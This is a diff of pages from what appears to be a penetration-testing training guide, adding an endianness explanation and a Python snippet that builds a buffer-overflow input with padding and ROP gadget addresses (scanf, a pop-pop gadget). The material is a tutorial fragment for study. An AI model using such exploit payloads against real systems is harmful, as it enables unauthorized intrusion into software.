@@ -44,7 +44,7 @@
         <link rel="search" title="Search" href="../search.html"/>
     <link rel="top" title="South Bay WASP 1.0.3 documentation" href="../index.html"/>
         <link rel="up" title="9. Pentest Buffer Overflow" href="../pentest_buffer_overflow.html"/>
-        <link rel="next" title="10. Pentest scripting" href="../pentest_scripting.html"/>
+        <link rel="next" title="9.5. ROP Example" href="rop_example.html"/>
         <link rel="prev" title="9.3. Return-oriented programming" href="rop.html"/> 
 
   
@@ -123,7 +123,7 @@
 <li class="toctree-l3"><a class="reference internal" href="#generating-shellcode">9.4.2. Generating shellcode</a><ul>
 <li class="toctree-l4"><a class="reference internal" href="#manually-code">9.4.2.1. Manually code</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#canned-shellcode">9.4.2.2. Canned shellcode</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id2">9.4.2.3. Metasploit</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id22">9.4.2.3. Metasploit</a></li>
 </ul>
 </li>
 <li class="toctree-l3"><a class="reference internal" href="#manipulating-shellcode">9.4.3. Manipulating shellcode</a><ul>
@@ -138,6 +138,7 @@
 </li>
 </ul>
 </li>
+<li class="toctree-l2"><a class="reference internal" href="rop_example.html">9.5. ROP Example</a></li>
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
@@ -250,8 +251,59 @@
 </ul>
 </div>
 <div class="section" id="endianness">
-<h3>9.4.1.4. Endianness<a class="headerlink" href="#endianness" title="Permalink to this headline">¶</a></h3>
+<span id="endian"></span><h3>9.4.1.4. Endianness<a class="headerlink" href="#endianness" title="Permalink to this headline">¶</a></h3>
 <p><a class="reference external" href="https://en.wikipedia.org/wiki/Endianness">Endianness</a> “refers to the order of the bytes, comprising a digital word, in computer memory. … Intel x86 processors use little-endian.” Take the hex value 0x12345678: the little-endian representation as consecutive bytes would be 0x78, 0x56, 0x34, then 0x12. Remember that shellcode is often input as a string, so byte order is important.</p>
+<div class="section" id="writing-down-numbers">
+<h4>9.4.1.4.1. Writing down numbers<a class="headerlink" href="#writing-down-numbers" title="Permalink to this headline">¶</a></h4>
+<p>When writing down numbers in a left-to-right language the most significant digit comes first. This is writing in big-endian format. So the current year as of this writing is “2018” and not the little-endian format of “8102”.</p>
+<p>Similarly for hex representation we would write “0x7e2” and not “0x2e7”.</p>
+</div>
+<div class="section" id="consequences-of-computers-being-based-on-bytes">
+<h4>9.4.1.4.2. Consequences of computers being based on bytes<a class="headerlink" href="#consequences-of-computers-being-based-on-bytes" title="Permalink to this headline">¶</a></h4>
+<p>Computers store and address bytes of information, so numbers are represented as a sequence of bytes and not a sequence of hex digits. What does this mean for the Intel (little-endian) architecture?</p>
+<p>Consider 0x12345678 being stored in the little-endian (Intel) format. It’s stored as a sequence of 4 bytes, starting with the least-significant byte: 0x78, 0x56, 0x34, 0x12.</p>
+<p>First note that whenever you’re writing a number to be stored in any length of number in a computer, you write it down in big-endian format. So when you break 0x12345678 into 4 bytes you first get bytes 0x12, 0x34, 0x56, 0x78. Then rearrange those bytes into little endian order to get 0x78, 0x56, 0x34, 0x12. Note that when converted to bytes you still write the byte value big-endian, so the result is <em>not</em> 87654321, but 78563412. If the computer had 4 bit bytes it would be 87654321, but it has 8 bit bytes and so 78563412 is used.</p>
+</div>
+<div class="section" id="python-based-buffer-overflow-considerations">
+<h4>9.4.1.4.3. Python-based buffer overflow considerations<a class="headerlink" href="#python-based-buffer-overflow-considerations" title="Permalink to this headline">¶</a></h4>
+<p>To exploit a buffer overflow overflow using Python involves creating a carefully crafted input file often represented as a list []. Here we show an example input file that consists of the input “42n” followed by 267 X’s and our exploit code. We might start out with the following Python 2 snippet:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="hll"><span class="n">exploit</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;42</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="p">)</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;X&quot;</span><span class="o">*</span><span class="mi">267</span><span class="p">)</span>
+</span>
+<span class="hll"><span class="n">outstring</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+</span><span class="hll"><span class="k">print</span><span class="p">(</span><span class="n">outstring</span><span class="p">)</span>
+</span></pre></div>
+</div>
+<p>If you run the above snippet you should get the following output:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">42</span>
+<span class="go">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre></div>
+</div>
+<p>At this point we want to append after the X’s the addresses of ROP (Return Oriented Programming) gadgets (code sections). So how do we do this? We’ll use either the <a class="reference external" href="https://docs.python.org/2/library/struct.html">Python 2 struct</a> or <a class="reference external" href="https://docs.python.org/3/library/struct.html">Python 3 struct</a>, which allows us to pack data together. In this case we’ll be using the “I” (unsigned long = 4 byte) format in the convenience function <strong class="program">p</strong>. Note that items added to the buffer are pointers to the libc function <strong class="program">scanf</strong> or pointers to ROP gadgets.</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="hll"><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class="hll"><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+</span><span class="hll">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
+</span>
+<span class="n">exploit</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;42</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="p">)</span>
+<span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&quot;X&quot;</span><span class="o">*</span><span class="mi">267</span><span class="p">)</span>
+
+<span class="hll"><span class="c1">#   scanf address = 0x080483bc</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x080483bc</span><span class="p">))</span>
+</span><span class="hll"><span class="c1">#   Get rid of 2 scanf arguments, gadget 0x8048462L: pop ebx ; pop ebp ;;</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x8048462</span><span class="p">))</span>
+</span><span class="hll"><span class="c1">#   1st arg = 0x08048707, pointer to %s</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x08048707</span><span class="p">))</span>
+</span><span class="hll"><span class="c1">#   2nd arg = stage1addr, pointer into .data</span>
+</span><span class="hll"><span class="n">stage1addr</span> <span class="o">=</span> <span class="mh">0x0804aa24</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">stage1addr</span><span class="p">))</span>
+</span>
+<span class="n">outstring</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">outstring</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
 </div>
 </div>
 <div class="section" id="generating-shellcode">
@@ -270,8 +322,8 @@
 <dd>Archived shellcode for various operating systems and architectures.</dd>
 </dl>
 </div>
-<div class="section" id="id2">
-<h3>9.4.2.3. Metasploit<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="id22">
+<h3>9.4.2.3. Metasploit<a class="headerlink" href="#id22" title="Permalink to this headline">¶</a></h3>
 <p>Metasploit can be used to generate shellcode, both via <strong class="program">msfconsole</strong> (using “generate”) and <strong class="program">msfvenom</strong>. Here we focus on <strong class="program">msfvenom</strong>, though <strong class="program">msfconsole</strong> is needed to determine payload options. There are several new changes regarding Metasploit in Kali 2.0:</p>
 <ul>
 <li><p class="first">Kali 2.0 includes a version of Metasploit Framework.</p>
@@ -709,7 +761,7 @@ gdb --batch --command<span class="o">=</span>gdb.in ./shellcode
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../pentest_scripting.html" class="btn btn-neutral float-right" title="10. Pentest scripting" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+        <a href="rop_example.html" class="btn btn-neutral float-right" title="9.5. ROP Example" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
       
       
         <a href="rop.html" class="btn btn-neutral" title="9.3. Return-oriented programming" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
